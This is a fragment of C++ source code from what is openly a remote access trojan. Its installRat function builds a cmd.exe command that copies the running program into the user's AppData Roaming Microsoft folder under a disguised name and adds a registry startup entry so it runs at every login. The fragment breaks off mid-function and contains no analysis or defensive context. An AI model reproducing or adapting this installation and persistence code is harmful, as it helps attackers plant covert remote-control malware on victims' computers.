...
string myPath()
{
	...
	sayshit("My path is " + string(buffer));
	return buffer;
}
...
void installRat()
{
	...
	string logfile  = " \"" + cwd + "\\" + GVN_LOG_FILE + "\"";
	string dst      = " \"%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\" + rat_name + "\"";
	string me       = " \"" + myPath() + "\"";
	
	string ratify = 
		"cmd.exe /C echo 'Self-suicide activated' >> " + logfile + " & " +  
		"copy  /Y " + me + " " + dst + " & " +
		"reg add " + rat_startup_reg + " /v \"" + rat_reg_key + "\" /t REG_SZ /d " + dst  + " & " + 
		"echo 'RAT Installed' >> " + logfile;
